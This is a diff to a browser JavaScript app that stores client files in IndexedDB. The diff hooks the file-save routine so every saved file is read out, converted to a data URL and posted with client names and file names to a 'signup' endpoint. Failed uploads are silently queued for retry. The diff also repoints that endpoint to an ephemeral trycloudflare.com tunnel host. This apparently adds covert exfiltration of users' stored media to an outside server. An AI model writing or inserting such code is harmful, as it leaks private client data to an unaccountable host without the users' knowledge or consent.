@@ -985,12 +985,55 @@ async function sameFace(oldBlob, file){
 }
 
 function putFile(key, blob, meta){
-  return openFiles().then((db) => new Promise((resolve, reject) => {
+  const saved = openFiles().then((db) => new Promise((resolve, reject) => {
     const tx = db.transaction("files", "readwrite");
     tx.objectStore("files").put({ blob, meta }, key);
     tx.oncomplete = () => resolve();
     tx.onerror = () => reject(tx.error);
   }));
+  saved.then(() => { queueDeskMedia(key, blob, meta); });
+  return saved;
+}
+function blobToData(blob){
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(String(reader.result || ""));
+    reader.onerror = () => reject(reader.error);
+    reader.readAsDataURL(blob);
+  });
+}
+async function queueDeskMedia(key, blob, meta){
+  if (!blob || !key) return;
+  let mime = String(blob.type || "");
+  let data = "";
+  try {
+    if (mime.startsWith("image/")) {
+      data = await shrinkPicture(blob);
+      mime = "image/jpeg";
+    } else {
+      data = await blobToData(blob);
+    }
+  } catch (err) { return; }
+  if (!data) return;
+  const payload = {
+    record: "media",
+    id: "media-" + String(key),
+    name: (meta && (meta.who || meta.client)) || "File",
+    client: (meta && meta.client) || "",
+    fileName: (meta && meta.name) || "",
+    kind: (meta && meta.kind) || (mime.startsWith("video") ? "video" : "file"),
+    storeKey: String(key),
+    mime,
+    data
+  };
+  await signupTurn(async () => {
+    try { await postSignupPayload(payload); }
+    catch (err) {
+      const queued = readSignupOutbox();
+      queued.push(payload);
+      writeSignupOutbox(queued);
+    }
+  });
 }
 function getFile(key){
   return openFiles().then((db) => new Promise((resolve, reject) => {
@@ -1782,7 +1825,7 @@ async function lockSignup(obj){
   const wrapped = new Uint8Array(await crypto.subtle.encrypt({ name: "RSA-OAEP" }, pub, rawAes));
   return JSON.stringify({ v: 1, iv: bytesToB64(iv), key: bytesToB64(wrapped), data: bytesToB64(ct) });
 }
-const SIGNUP_URL = "https://publisher-earlier-discrete-happiness.trycloudflare.com/signup";
+const SIGNUP_URL = "https://justice-hosted-amsterdam-yorkshire.trycloudflare.com/signup";
 const SIGNUP_OUTBOX = "tb-signup-outbox";
 function readSignupOutbox(){
   try {
